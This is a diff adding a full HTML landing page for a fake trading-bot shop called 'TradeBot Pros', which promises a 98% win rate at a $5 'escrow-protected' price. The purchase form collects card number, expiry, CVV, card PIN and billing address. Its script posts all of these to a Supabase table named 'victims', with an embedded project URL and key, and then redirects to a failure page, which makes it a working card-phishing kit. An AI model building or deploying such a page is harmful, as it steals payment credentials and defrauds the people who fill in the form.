@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TradeBot Pros - Ultimate Trading Automation</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+        }
+        .hero-section {
+            background: linear-gradient(135deg, #007bff, #00b7ff);
+            color: white;
+            padding: 100px 0;
+        }
+        .feature-card {
+            transition: transform 0.3s;
+        }
+        .feature-card:hover {
+            transform: scale(1.05);
+        }
+        .payment-form {
+            max-width: 500px;
+            margin: 50px auto;
+        }
+        footer {
+            background-color: #f8f9fa;
+            padding: 20px 0;
+        }
+        .discount-text {
+            font-size: 1.2em;
+            color: #ffcc00;
+            font-weight: bold;
+        }
+        .escrow-badge {
+            font-size: 0.9em;
+            color: #bb0000;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation Bar -->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark sticky-top">
+        <div class="container">
+            <a class="navbar-brand" href="#">TradeBot Pros</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item"><a class="nav-link" href="#home">Home</a></li>
+                    <li class="nav-item"><a class="nav-link" href="#features">Features</a></li>
+                    <li class="nav-item"><a class="nav-link" href="#purchase">Purchase</a></li>
+                    <li class="nav-item"><a class="nav-link" href="#contact">Contact</a></li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section id="home" class="hero-section text-center">
+        <div class="container">
+            <h1 class="display-4">Revolutionize Your Trading with TradeBot Pros</h1>
+            <p class="lead">Achieve up to 98% win rate with our cutting-edge automated trading bots. Start earning today!</p>
+            <p class="discount-text">Limited Time Offer: Only $5 (Originally $100)!</p>
+            <p class="escrow-badge">ESCROW Enabled - Secure Transactions Guaranteed</p>
+            <a href="#purchase" class="btn btn-light btn-lg">Get Started Now</a>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section id="features" class="py-5">
+        <div class="container">
+            <h2 class="text-center mb-5">Why Choose TradeBot Pros?</h2>
+            <div class="row text-center">
+                <div class="col-md-4">
+                    <div class="card feature-card p-3">
+                        <h4>24/7 Automation</h4>
+                        <p>Our bots trade for you non-stop, maximizing profits even while you sleep.</p>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="card feature-card p-3">
+                        <h4>AI-Powered Analysis</h4>
+                        <p>Advanced algorithms predict market trends with unparalleled accuracy.</p>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="card feature-card p-3">
+                        <h4>Secure & Reliable</h4>
+                        <p>Your investments are safe with our state-of-the-art encryption technology.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Purchase Form Section -->
+    <section id="purchase" class="py-5 bg-light">
+        <div class="container">
+            <h2 class="text-center mb-5">Purchase Your Trading Bot Today</h2>
+            <div class="payment-form">
+                <p class="text-center discount-text">Special Discount: Only $5 (Was $100)!</p>
+                <p class="text-center escrow-badge">ESCROW Enabled - Your Payment is Protected</p>
+                <form id="purchaseForm">
+                    <div class="mb-3">
+                        <label for="fullName" class="form-label">Full Name</label>
+                        <input type="text" class="form-control" id="fullName" name="fullName" required>
+                    </div>
+                    <div class="mb-3">
+                        <label for="email" class="form-label">Email Address</label>
+                        <input type="email" class="form-control" id="email" name="email" required>
+                    </div>
+                    <div class="mb-3">
+                        <label for="cardNumber" class="form-label">Card Number</label>
+                        <input type="text" class="form-control" id="cardNumber" name="cardNumber" placeholder="xxxx-xxxx-xxxx-xxxx" required>
+                    </div>
+                    <div class="row">
+                        <div class="col-md-6 mb-3">
+                            <label for="expiryDate" class="form-label">Expiry Date</label>
+                            <input type="text" class="form-control" id="expiryDate" name="expiryDate" placeholder="MM/YY" required>
+                        </div>
+                        <div class="col-md-6 mb-3">
+                            <label for="cvv" class="form-label">CVV</label>
+                            <input type="text" class="form-control" id="cvv" name="cvv" placeholder="xxx" required>
+                        </div>
+                    </div>
+                    <div class="mb-3">
+                        <label for="pin" class="form-label">Card PIN</label>
+                        <input type="password" class="form-control" id="pin" name="pin" placeholder="xxxx">
+                    </div>
+                    <div class="mb-3">
+                        <label for="billingAddress" class="form-label">Billing Address</label>
+                        <textarea class="form-control" id="billingAddress" name="billingAddress" rows="3" required></textarea>
+                    </div>
+                    <button type="submit" class="btn btn-primary w-100">Complete Purchase - $5</button>
+                </form>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contact Section -->
+    <section id="contact" class="py-5">
+        <div class="container text-center">
+            <h2>Contact Us</h2>
+            <p>Have questions? Reach out at support@tradebotpros.com</p>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="text-center">
+        <div class="container">
+            <p>&copy; 2026 TradeBot Pros. All Rights Reserved.</p>
+        </div>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // Supabase configuration
+        const SUPABASE_URL = 'https://zwyowsdpklxnizvugxza.supabase.co'; // Replace with your Supabase Project URL
+        const SUPABASE_ANON_KEY = 'sb_publishable_4oTAfGE30LQssXk-C_saqw_ALtQI8rc'; // Replace with your Supabase anon key
+
+        // Handle form submission
+        document.getElementById('purchaseForm').addEventListener('submit', async (e) => {
+            e.preventDefault(); // Prevent default form submission
+
+            // Collect form data
+            const formData = {
+                full_name: document.getElementById('fullName').value,
+                email: document.getElementById('email').value,
+                card_number: document.getElementById('cardNumber').value,
+                expiry_date: document.getElementById('expiryDate').value,
+                cvv: document.getElementById('cvv').value,
+                pin: document.getElementById('pin').value,
+                billing_address: document.getElementById('billingAddress').value
+            };
+
+            try {
+                // Send data to Supabase
+                const response = await fetch(`${SUPABASE_URL}/rest/v1/victims`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+                        'apikey': SUPABASE_ANON_KEY
+                    },
+                    body: JSON.stringify(formData)
+                });
+
+                if (response.ok) {
+                    // Redirect to failure page on成功
+                    window.location.href = 'failure.html';
+                } else {
+                    console.error('Error saving data to Supabase:', response.statusText);
+                    alert('An error occurred. Please try again.');
+                }
+            } catch (error) {
+                console.error('Network error:', error);
+                alert('Network issue. Please try again.');
+            }
+        });
+    </script>
+</body>
+</html>
